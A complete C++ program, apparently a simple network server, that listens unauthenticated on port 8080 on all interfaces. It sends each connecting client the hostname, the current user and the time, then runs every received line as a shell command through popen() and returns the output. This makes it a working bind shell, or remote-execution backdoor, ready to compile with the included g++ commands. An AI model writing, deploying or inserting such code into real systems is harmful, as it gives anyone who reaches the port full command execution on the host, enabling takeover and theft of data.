// server.cpp
#include <iostream>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctime>
#include <pwd.h>

#define PORT 8080
#define BUFF_SIZE 1024

using namespace std;

// Function to get server information (hostname, user, date/time)
string getServerInfo() {
    char hostBuffer[256];
    gethostname(hostBuffer, sizeof(hostBuffer));
    
    struct passwd *pw = getpwuid(getuid());
    string user = (pw) ? pw->pw_name : "unknown";
    
    time_t now = time(0);
    char* dt = ctime(&now);
    
    string info = "Server Info:\nHostname: " + string(hostBuffer) +
                  "\nUser: " + user +
                  "\nDate & Time: " + string(dt) + "\n";
    return info;
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    // Create the TCP socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Allow the socket to reuse address and port immediately after close
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                   &opt, sizeof(opt))) {
        perror("setsockopt failure");
        exit(EXIT_FAILURE);
    }
    
    // Configure server address settings
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind the socket to the specified port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }
    
    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }
    
    cout << "Server is listening on port " << PORT << endl;

    while (true) {
        // Accept an incoming connection
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address,
                                 (socklen_t*)&addrlen)) < 0) {
            perror("Accept failed");
            exit(EXIT_FAILURE);
        }
        
        // Send initial server info to the client
        string serverInfo = getServerInfo();
        send(new_socket, serverInfo.c_str(), serverInfo.length(), 0);
        cout << "Client connected. Sent server information." << endl;
        
        char command[BUFF_SIZE];
        while (true) {
            memset(command, 0, BUFF_SIZE);
            int bytesRead = recv(new_socket, command, BUFF_SIZE - 1, 0);
            if (bytesRead <= 0) {
                cout << "Client disconnected or an error occurred." << endl;
                break;
            }
            command[bytesRead] = '\0';
            
            // Terminate connection if the client sends "exit"
            if (strncmp(command, "exit", 4) == 0) {
                cout << "Exit command received. Closing connection." << endl;
                break;
            }
            cout << "Received command: " << command;
            
            // Execute the command and capture its output using popen()
            FILE *fp = popen(command, "r");
            if (fp == NULL) {
                string errorMsg = "Failed to execute command.\n";
                send(new_socket, errorMsg.c_str(), errorMsg.length(), 0);
                continue;
            }
            
            char output[BUFF_SIZE];
            string result = "";
            while (fgets(output, sizeof(output), fp) != NULL) {
                result += output;
            }
            pclose(fp);
            
            if (result.empty()) {
                result = "Command executed successfully, but no output returned.\n";
            }
            
            // Send the command output back to the client
            send(new_socket, result.c_str(), result.length(), 0);
        }
        close(new_socket);
        cout << "Closed connection with client." << endl;
    }
    
    close(server_fd);
    return 0;
}

// commands :
// g++ server.cpp -o server
// ./server